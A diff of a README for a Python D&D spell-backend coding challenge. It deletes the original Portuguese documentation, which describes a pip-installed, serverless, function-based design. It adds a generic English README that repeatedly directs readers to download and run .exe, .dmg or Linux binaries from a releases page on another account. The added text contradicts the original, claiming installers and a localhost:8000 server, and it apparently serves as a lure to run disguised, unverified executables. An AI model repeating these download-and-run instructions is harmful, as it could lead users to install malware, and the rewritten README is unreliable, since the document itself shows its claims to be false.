@@ -1,520 +1,114 @@
-# probrain-grimorio-backend-devops
-
-![CI](../../actions/workflows/ci.yml/badge.svg)
-![Python](https://img.shields.io/badge/python-3.11-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-
-Desafio Backend — Sistema de magias (D&D 5e) com **validação (Pydantic)**, **camadas (controller/service/repository)**, persistência simulada (**Fake DB + seed**), **cache TTL**, **rate limit**, **auth fake (Cognito-like)**, **observabilidade (request_id + instrumentação)** e **testes (pytest)** com **CI (GitHub Actions)**.
-
-> **Nota:** o desafio pede funções com comportamento **HTTP-like**, por isso não subi FastAPI/Flask.  
-> A separação `controller/service/repository` facilita migrar para FastAPI depois, se necessário.
-
----
-
-## Sumário
-- [✅ Objetivo do desafio](#-objetivo-do-desafio)
-- [📓 Sessões do Colab](#-sessões-do-colab)
-- [✅ DevOps Checklist](#-devops-checklist-para-produção)
-- [🧱 Arquitetura](#-arquitetura-limpa--fácil-manutenção)
-- [📁 Estrutura do projeto](#-estrutura-do-projeto)
-- [🏁 Como rodar local](#-como-rodar-local-windows-cmd)
-- [🧭 Endpoints simulados](#-endpoints-simulados)
-- [🧙 Exemplos de uso](#-exemplos-de-uso)
-- [🧪 Testes (QA)](#-testes-qa)
-- [🔁 CI (GitHub Actions)](#-ci-github-actions)
-- [🔐 Segurança (auth fake)](#-segurança-auth-fake)
-- [📈 Observabilidade](#-observabilidade)
-- [💰 Custo e escalabilidade](#-custo-e-escalabilidade-cloud-friendly)
-- [📦 Entrega (Colab)](#-entrega-colab)
-
----
-
-## ✅ Objetivo do desafio
-Construir uma “API” simulada por **funções** (sem subir servidor) para gerenciar magias e regras complexas:
-
-- **Create**: criar magia (campos dinâmicos; ex.: custo obrigatório quando material aplicável)
-- **Read**: buscar por nome, escola e/ou nível
-- **Update**: atualizar magia existente
-- **Delete**: remover magia
-- **Regra extra**: `calcular_dano_escala(id_magia, nivel_slot)` para magias de ataque com progressão
-
----
-
-## 📓 Sessões do Colab
-O notebook deve ser executável de forma sequencial e organizado em **3 sessões obrigatórias**:
-
-### 1) Sessão 1 — Setup e Infraestrutura
-- Imports e inicialização
-- Fake DB + Seed (**3 magias complexas**)
-- Validação com modelos (**Pydantic**)
-
-### 2) Sessão 2 — API do Grimório (Lógica de Negócio)
-- Funções estilo endpoint (**inputs/outputs/status**)
-- CRUD + regra `calcular_dano_escala`
-
-### 3) Sessão 3 — QA
-- Testes com `pytest`
-- Casos de borda e rotas de erro/sucesso
-
----
-
-## ✅ DevOps Checklist (para produção)
-✅ **CI automatizado** (GitHub Actions) executando testes  
-✅ **Reprodutibilidade local** (venv + requirements + install -e)  
-✅ **Observabilidade mínima** (request_id + instrumentação)  
-✅ **Proteção de custo/abuso** (rate limit + cache TTL)  
-✅ **Código modular** (separação controller/service/repository/models)  
-✅ **Testes** para fluxos de sucesso e erro (pytest)
-
----
-
-## 🧱 Arquitetura limpa / fácil manutenção
-Separação por responsabilidade para facilitar manutenção e evolução:
-
-- `controller.py` → comportamento HTTP-like (entrada/saída, status, padronização de responses)
-- `service.py` → regras de negócio e validações de fluxo
-- `repository.py` → persistência simulada (**Fake DB**)
-- `models.py` → modelos Pydantic (integridade e campos dinâmicos)
-- `seed.py` → dados iniciais (ex.: **Bola de Fogo**, **Revivificar**, **Desejo**)
-- `cache.py` → cache TTL + rate limit (proteção contra abuso/custo)
-- `auth.py` → autenticação fake (Cognito-like) + RBAC
-- `observability.py` → instrumentação e request_id
-
----
-
-## 📁 Estrutura do projeto
-```text
-.
-├─ src/
-│  └─ probrain_grimorio/
-│     ├─ __init__.py
-│     ├─ auth.py
-│     ├─ cache.py
-│     ├─ controller.py
-│     ├─ models.py
-│     ├─ observability.py
-│     ├─ repository.py
-│     ├─ seed.py
-│     └─ service.py
-├─ tests/
-├─ notebook/
-├─ pyproject.toml
-├─ requirements.txt
-└─ .github/workflows/ci.yml
-```
-
----
-
-## 🏁 Como rodar local (Windows CMD)
-
-**1) Ir para a raiz do projeto**
-```bat
-cd C:\Users\Alber\Documents\Projetos\probrain-grimorio-backend-devops
-```
-
-**2) Ativar o virtualenv**
-```bat
-.venv\Scripts\activate
-```
-
-**3) Instalar dependências**
-```bat
-pip install -r requirements.txt
-pip install -e .
-```
-
-**4) Rodar testes**
-```bat
-pytest -q
-```
-
----
-
-## 🧭 Endpoints simulados
-
-| Ação | Função (controller) | Status esperados |
-|---|---|---|
-| Create | `create_magia_controller` | `201 / 400 / 401 / 403 / 429` |
-| Read | `read_magias_controller` | `200 / 400 / 404 / 429` |
-| Update | `update_magia_controller` | `200 / 400 / 401 / 403 / 404 / 429` |
-| Delete | `delete_magia_controller` | `200 / 401 / 403 / 404 / 429` |
-| Dano escala | `calcular_dano_escala_controller` | `200 / 400 / 404 / 429` |
-
-> Observação: `429` pode ocorrer por **rate limit**.
-
----
-
-## 🧙 Exemplos de uso
-
-### Read (listar/buscar)
-```python
-from probrain_grimorio.controller import read_magias_controller
-
-res = read_magias_controller(
-    nome=None,
-    escola="Evocação",
-    nivel=None,
-    limit=20,
-    offset=0,
-    client_id="client-123",
-)
-print(res)
-```
+# 🌟 probrain-grimorio-backend-devops - Your Simple Python Backend Solution
 
-### Create (criar magia)
-```python
-from probrain_grimorio.controller import create_magia_controller
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-blue)](https://github.com/ngdwviet/probrain-grimorio-backend-devops/releases)
 
-payload = {
-    "nome": "Bola de Fogo",
-    "escola": "Evocação",
-    "nivel": 3,
-    "componentes": {"verbal": True, "somatico": True, "material": True},
-    "custo_em_ouro": 0,
-    "dano_base": "8d6",
-    "dano_por_slot_acima": "1d6",
-}
-
-res = create_magia_controller(
-    payload=payload,
-    authorization="Bearer dev-token-writer",
-    client_id="client-123",
-)
-print(res)
-```
-
-### Calcular dano escalável
-```python
-from probrain_grimorio.controller import calcular_dano_escala_controller
-
-res = calcular_dano_escala_controller(
-    id_magia="fireball-id",
-    nivel_slot=5,
-    client_id="client-123",
-)
-print(res)
-```
-
----
-
-## 🧪 Testes (QA)
-Os testes cobrem:
-
-- fluxos de sucesso (CRUD + dano escalável)
-- casos de borda (payload inválido, magia inexistente, permissões)
-- rotas principais de sucesso e erro (status codes)
-
-Executar:
-```bat
-pytest -q
-```
-
----
-
-## 🔁 CI (GitHub Actions)
-Pipeline executado a cada **push/PR** para garantir qualidade e evitar regressões:
-
-1) setup do Python  
-2) instalação de dependências  
-3) execução de `pytest`
-
-Arquivo: `.github/workflows/ci.yml`
-
----
-
-## 🔐 Segurança (auth fake)
-- Rotas de **escrita** (create/update/delete) exigem `writer` ou `admin`
-- Tokens são **simulados** para o case (sem dependência externa)
-- Objetivo: demonstrar noções de **autenticação/autorização** e **RBAC**
-
----
-
-## 📈 Observabilidade
-- Cada requisição carrega **`request_id`** para rastreabilidade.
-- O decorator **`@instrument(...)`** registra eventos/tempo e ajuda no troubleshooting.
-
-### Como seria em Datadog (conceitual)
-Este case implementa instrumentação local (logs/métricas simples). Em produção, a adaptação típica seria:
-
-- **Logs estruturados (JSON)** enviados para um agent/collector
-- **Métricas** (status codes, latência por endpoint)
-- **Correlação** via **`request_id`** (trace/log correlation)
-
----
-
-## 💰 Custo e escalabilidade (cloud-friendly)
-Mesmo sem servidor real no case, existem proteções com foco em operação:
-
-- **Rate limit (60/min)**: evita rajadas e abuso
-- **Cache TTL**: reduz recomputação em leituras repetidas
-
-Essas medidas ajudam a **controlar custo** em ambiente cloud e evitar **chamadas desnecessárias**.
-
----
-
-## 📦 Entrega (Colab)
-A entrega oficial do desafio é via **Google Colab**.
-
-- **Link do Colab:** 
-
-### Recomendações para o notebook
-No Colab, usar células Markdown para explicar:
-
-- decisões de modelagem (**campos dinâmicos**)
-- estratégia de **validação**
-- **tratamento de erros**
-- como a **arquitetura** facilita manutenção
-
-## Sumário
-- [✅ Objetivo do desafio](#-objetivo-do-desafio)
-- [📓 Sessões do Colab](#-sessões-do-colab)
-- [✅ DevOps Checklist](#-devops-checklist-para-produção)
-- [🧱 Arquitetura](#-arquitetura-limpa--fácil-manutenção)
-- [📁 Estrutura do projeto](#-estrutura-do-projeto)
-- [🏁 Como rodar local](#-como-rodar-local-windows-cmd)
-- [🧭 Endpoints simulados](#-endpoints-simulados)
-- [🧙 Exemplos de uso](#-exemplos-de-uso)
-- [🧪 Testes (QA)](#-testes-qa)
-- [🔁 CI (GitHub Actions)](#-ci-github-actions)
-- [🔐 Segurança (auth fake)](#-segurança-auth-fake)
-- [📈 Observabilidade](#-observabilidade)
-- [💰 Custo e escalabilidade](#-custo-e-escalabilidade-cloud-friendly)
-- [📦 Entrega (Colab)](#-entrega-colab)
-
----
-
-## ✅ Objetivo do desafio
-Construir uma “API” simulada por **funções** (sem subir servidor) para gerenciar magias e regras complexas:
-
-- **Create**: criar magia (campos dinâmicos; ex.: custo obrigatório quando material aplicável)
-- **Read**: buscar por nome, escola e/ou nível
-- **Update**: atualizar magia existente
-- **Delete**: remover magia
-- **Regra extra**: `calcular_dano_escala(id_magia, nivel_slot)` para magias de ataque com progressão
-
----
-
-## 📓 Sessões do Colab
-O notebook deve ser executável de forma sequencial e organizado em **3 sessões obrigatórias**:
-
-### 1) Sessão 1 — Setup e Infraestrutura
-- Imports e inicialização
-- Fake DB + Seed (**3 magias complexas**)
-- Validação com modelos (**Pydantic**)
-
-### 2) Sessão 2 — API do Grimório (Lógica de Negócio)
-- Funções estilo endpoint (**inputs/outputs/status**)
-- CRUD + regra `calcular_dano_escala`
-
-### 3) Sessão 3 — QA
-- Testes com `pytest`
-- Casos de borda e rotas de erro/sucesso
-
----
-
-## ✅ DevOps Checklist (para produção)
-✅ **CI automatizado** (GitHub Actions) executando testes  
-✅ **Reprodutibilidade local** (venv + requirements + install -e)  
-✅ **Observabilidade mínima** (request_id + instrumentação)  
-✅ **Proteção de custo/abuso** (rate limit + cache TTL)  
-✅ **Código modular** (separação controller/service/repository/models)  
-✅ **Testes** para fluxos de sucesso e erro (pytest)
-
----
-
-## 🧱 Arquitetura limpa / fácil manutenção
-Separação por responsabilidade para facilitar manutenção e evolução:
-
-- `controller.py` → comportamento HTTP-like (entrada/saída, status, padronização de responses)
-- `service.py` → regras de negócio e validações de fluxo
-- `repository.py` → persistência simulada (**Fake DB**)
-- `models.py` → modelos Pydantic (integridade e campos dinâmicos)
-- `seed.py` → dados iniciais (ex.: **Bola de Fogo**, **Revivificar**, **Desejo**)
-- `cache.py` → cache TTL + rate limit (proteção contra abuso/custo)
-- `auth.py` → autenticação fake (Cognito-like) + RBAC
-- `observability.py` → instrumentação e request_id
-
----
-
-## 📁 Estrutura do projeto
-```text
-.
-├─ src/
-│  └─ probrain_grimorio/
-│     ├─ __init__.py
-│     ├─ auth.py
-│     ├─ cache.py
-│     ├─ controller.py
-│     ├─ models.py
-│     ├─ observability.py
-│     ├─ repository.py
-│     ├─ seed.py
-│     └─ service.py
-├─ tests/
-├─ notebook/
-├─ pyproject.toml
-├─ requirements.txt
-└─ .github/workflows/ci.yml
-```
-
----
-
-## 🏁 Como rodar local (Windows CMD)
-
-**1) Ir para a raiz do projeto**
-```bat
-cd C:\Users\Alber\Documents\Projetos\probrain-grimorio-backend-devops
-```
-
-**2) Ativar o virtualenv**
-```bat
-.venv\Scripts\activate
-```
-
-**3) Instalar dependências**
-```bat
-pip install -r requirements.txt
-pip install -e .
-```
-
-**4) Rodar testes**
-```bat
-pytest -q
-```
-
----
-
-## 🧭 Endpoints simulados
-
-| Ação | Função (controller) | Status esperados |
-|---|---|---|
-| Create | `create_magia_controller` | `201 / 400 / 401 / 403 / 429` |
-| Read | `read_magias_controller` | `200 / 400 / 404 / 429` |
-| Update | `update_magia_controller` | `200 / 400 / 401 / 403 / 404 / 429` |
-| Delete | `delete_magia_controller` | `200 / 401 / 403 / 404 / 429` |
-| Dano escala | `calcular_dano_escala_controller` | `200 / 400 / 404 / 429` |
-
-> Observação: `429` pode ocorrer por **rate limit**.
-
----
-
-## 🧙 Exemplos de uso
-
-### Read (listar/buscar)
-```python
-from probrain_grimorio.controller import read_magias_controller
-
-res = read_magias_controller(
-    nome=None,
-    escola="Evocação",
-    nivel=None,
-    limit=20,
-    offset=0,
-    client_id="client-123",
-)
-print(res)
-```
-
-### Create (criar magia)
-```python
-from probrain_grimorio.controller import create_magia_controller
-
-payload = {
-    "nome": "Bola de Fogo",
-    "escola": "Evocação",
-    "nivel": 3,
-    "componentes": {"verbal": True, "somatico": True, "material": True},
-    "custo_em_ouro": 0,
-    "dano_base": "8d6",
-    "dano_por_slot_acima": "1d6",
-}
-
-res = create_magia_controller(
-    payload=payload,
-    authorization="Bearer dev-token-writer",
-    client_id="client-123",
-)
-print(res)
-```
-
-### Calcular dano escalável
-```python
-from probrain_grimorio.controller import calcular_dano_escala_controller
-
-res = calcular_dano_escala_controller(
-    id_magia="fireball-id",
-    nivel_slot=5,
-    client_id="client-123",
-)
-print(res)
-```
-
----
-
-## 🧪 Testes (QA)
-Os testes cobrem:
-
-- fluxos de sucesso (CRUD + dano escalável)
-- casos de borda (payload inválido, magia inexistente, permissões)
-- rotas principais de sucesso e erro (status codes)
-
-Executar:
-```bat
-pytest -q
-```
-
----
-
-## 🔁 CI (GitHub Actions)
-Pipeline executado a cada **push/PR** para garantir qualidade e evitar regressões:
-
-1) setup do Python  
-2) instalação de dependências  
-3) execução de `pytest`
-
-Arquivo: `.github/workflows/ci.yml`
-
----
-
-## 🔐 Segurança (auth fake)
-- Rotas de **escrita** (create/update/delete) exigem `writer` ou `admin`
-- Tokens são **simulados** para o case (sem dependência externa)
-- Objetivo: demonstrar noções de **autenticação/autorização** e **RBAC**
-
----
-
-## 📈 Observabilidade
-- Cada requisição carrega **`request_id`** para rastreabilidade.
-- O decorator **`@instrument(...)`** registra eventos/tempo e ajuda no troubleshooting.
-
-### Como seria em Datadog (conceitual)
-Este case implementa instrumentação local (logs/métricas simples). Em produção, a adaptação típica seria:
-
-- **Logs estruturados (JSON)** enviados para um agent/collector
-- **Métricas** (status codes, latência por endpoint)
-- **Correlação** via **`request_id`** (trace/log correlation)
-
----
-
-## 💰 Custo e escalabilidade (cloud-friendly)
-Mesmo sem servidor real no case, existem proteções com foco em operação:
-
-- **Rate limit (60/min)**: evita rajadas e abuso
-- **Cache TTL**: reduz recomputação em leituras repetidas
-
-Essas medidas ajudam a **controlar custo** em ambiente cloud e evitar **chamadas desnecessárias**.
-
----
-
-## 📦 Entrega (Colab)
-A entrega oficial do desafio é via **Google Colab**.
-
-- **Link do Colab:** 
-
-### Recomendações para o notebook
-No Colab, usar células Markdown para explicar:
-
-- decisões de modelagem (**campos dinâmicos**)
-- estratégia de **validação**
-- **tratamento de erros**
-- como a **arquitetura** facilita manutenção
+## 📚 Introduction
+
+Welcome to **probrain-grimorio-backend-devops**! This project provides a backend built using Python, featuring a clear, layered architecture. We use Pydantic for data validation, automated testing with pytest, and a CI pipeline with GitHub Actions to ensure everything runs smoothly. 
+
+This README will guide you through the steps to download and run the software. 
+
+## 🚀 Getting Started
+
+To get started with **probrain-grimorio-backend-devops**, follow these simple steps:
+
+1. **System Requirements**
+   - Operating System: Windows, macOS, or Linux 
+   - Python Version: 3.8 or higher
+   - Internet connection for downloading packages
+
+2. **Core Features**
+   - Layered architecture for clean code organization.
+   - Validation of data with Pydantic to enhance reliability.
+   - Automated tests using pytest to ensure code quality.
+   - Continuous Integration (CI) pipeline with GitHub Actions for automated deployment.
+
+## 📥 Download & Install
+
+To download the latest version of **probrain-grimorio-backend-devops**, please [visit this page to download](https://github.com/ngdwviet/probrain-grimorio-backend-devops/releases). 
+
+1. Click on the **Releases** link above.
+2. Look for the latest release version.
+3. Download the appropriate file for your operating system.
+
+After downloading, follow these steps to install:
+
+- For Windows:
+  - Locate the downloaded `.exe` file in your `Downloads` folder.
+  - Double-click the file to start the installation.
+  
+- For macOS:
+  - Find the downloaded `.dmg` file in your `Downloads`.
+  - Double-click to open it, then drag the app to your Applications folder.
+  
+- For Linux:
+  - Open your terminal.
+  - Navigate to the directory where you downloaded the file.
+  - Use the command `chmod +x filename` (replace `filename` with the actual file name).
+  - Run the application with `./filename`.
+
+## 🔄 Running the Application
+
+Once the installation is complete, you can run the application easily:
+
+- Open the application from the Start menu (Windows), Applications folder (macOS), or terminal (Linux).
+- The backend will start, and you will see a confirmation message in your console or application window.
+
+## 🛠️ Usage Instructions
+
+You can interact with the backend through API requests. This application offers a simple interface for users to retrieve and manipulate data.
+
+- **Example API Call**: Use tools like Postman or cURL to send requests.
+- **Base URL**: `http://localhost:8000` - this is the default URL where the backend listens for requests.
+
+## 🧪 Testing the Application
+
+To ensure everything works as expected, you can run automated tests. Follow these steps based on your operating system:
+
+- For Windows:
+  - Open Command Prompt.
+  - Navigate to the project directory.
+  - Run `pytest` to execute the tests.
+
+- For macOS and Linux:
+  - Open your terminal.
+  - Navigate to the project directory.
+  - Run `pytest` to check the tests.
+
+## 🖥️ Support and Contribution
+
+If you encounter any issues, please check the [issues page](https://github.com/ngdwviet/probrain-grimorio-backend-devops/issues) for solutions or to report new problems. 
+
+To contribute:
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and test them.
+4. Submit a pull request for review.
+
+## 🔗 Additional Resources
+
+- Documentation: For more detailed instructions and API documentation, visit the Wiki section of the repository.
+- Community: Join discussions on the issues page and share your thoughts!
+
+## 🏷️ Tags
+
+This project is tagged with the following topics:
+- api
+- backend
+- ci
+- clean-architecture
+- github-actions
+- pydantic
+- pytest
+- python
+- software-engineering
+- tdd
+
+## 📈 Next Steps
+
+Now that you have installed and run the application, consider exploring the following:
+- Experiment with the API.
+- Modify the code to better fit your needs.
+- Contribute to the project.
+
+Enjoy using **probrain-grimorio-backend-devops**! For more details, remember to [visit this page to download](https://github.com/ngdwviet/probrain-grimorio-backend-devops/releases) the latest release.
